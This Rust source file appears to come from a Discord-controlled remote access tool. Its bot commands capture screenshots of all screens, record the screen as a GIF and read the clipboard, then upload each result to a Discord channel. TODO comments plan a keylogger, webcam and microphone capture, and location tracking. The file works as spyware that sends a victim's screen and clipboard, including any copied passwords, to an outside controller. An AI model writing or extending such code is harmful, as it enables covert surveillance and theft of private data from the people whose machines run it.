use crate::{
    commands::command_channel_check, reply_as_attachment, say, RuscordContext, RuscordResult,
};
use clipboard::ClipboardProvider;
use poise::serenity_prelude::*;
use screenshots::{
    image::{
        codecs::gif::{GifEncoder, Repeat},
        DynamicImage, Frame, ImageOutputFormat,
    },
    Screen,
};
use std::time::Duration;

/// Take a screenshot of the current screen
#[poise::command(prefix_command, slash_command, check = command_channel_check)]
pub async fn screenshot(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    ctx.defer().await?;

    if let Ok(screens) = Screen::all() {
        if screens.is_empty() {
            say!(ctx, "No screens detected");
            return Ok(());
        }

        let mut reply = poise::CreateReply::default().reply(true);

        for (i, screen) in screens.iter().enumerate() {
            if let Ok(image) = screen.capture() {
                // Convert to DynamicImage for compression
                let img = DynamicImage::ImageRgba8(image);

                // Convert to JPEG with compression
                let mut buffer = Vec::new();
                img.write_to(
                    &mut std::io::Cursor::new(&mut buffer),
                    ImageOutputFormat::Jpeg(80),
                )
                .unwrap();

                if buffer.len() >= 8_000_000 {
                    // TODO: support file hosting route?
                    debug!("Screenshot too large to send, skipping: {}", buffer.len());
                    continue;
                }
                reply = reply.attachment(CreateAttachment::bytes(
                    buffer,
                    format!("screenshot_{}.jpg", i),
                ));
            }
        }
        ctx.send(reply).await?;
    } else {
        say!(ctx, "Error obtaining screens");
    }

    Ok(())
}

/// Record the screen for a specified duration
// TODO: Review performance
#[poise::command(prefix_command, slash_command, check = command_channel_check)]
pub async fn record(
    ctx: RuscordContext<'_>,
    #[description = "Duration to record in seconds (min 5, max 60)"]
    #[min = 5]
    #[max = 60]
    duration: Option<u64>,
) -> RuscordResult<()> {
    ctx.defer().await?;
    let duration = duration.unwrap_or(30);
    let screens = Screen::all().unwrap(); // TODO: Fix unwrap

    if screens.is_empty() {
        say!(ctx, "No screens detected");
        return Ok(());
    }

    let screen = &screens[0];
    let mut frames = Vec::new();

    say!(ctx, "Recording for {} seconds...", duration);

    for _ in 0..duration {
        if let Ok(image) = screen.capture() {
            frames.push(image);
        }
        tokio::time::sleep(Duration::from_secs(1)).await;
    }

    say!(ctx, "Recording complete! Converting to GIF...");

    // Convert frames to GIF
    let mut buffer = Vec::new();
    {
        let mut encoder = GifEncoder::new_with_speed(&mut buffer, 10);
        encoder.set_repeat(Repeat::Infinite).unwrap();

        for frame in frames {
            encoder.encode_frame(Frame::new(frame)).unwrap();
        }
    }

    reply_as_attachment!(ctx, "screen_recording.gif", buffer: buffer);

    Ok(())
}
/// Get the current clipboard content
#[poise::command(prefix_command, slash_command, check = command_channel_check)]
pub async fn clipboard(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    ctx.defer().await?;

    let mut clipboard = clipboard::ClipboardContext::new()
        .map_err(|e| format!("Failed to access clipboard: {}", e))
        .unwrap(); // TODO: Fix unwrap

    let content = clipboard
        .get_contents()
        .map_err(|e| format!("Failed to get clipboard contents: {}", e))
        .unwrap(); // TODO: Fix unwrap

    if content.is_empty() {
        say!(ctx, "Clipboard is empty");
    } else {
        reply_as_attachment!(ctx, "clipboard.txt", buffer: content.as_bytes());
    }

    Ok(())
}

// TODO: keylogger
// TODO: webcam, record gif, record screenshot
// TODO: microphone, join voice channel
// TODO: location?
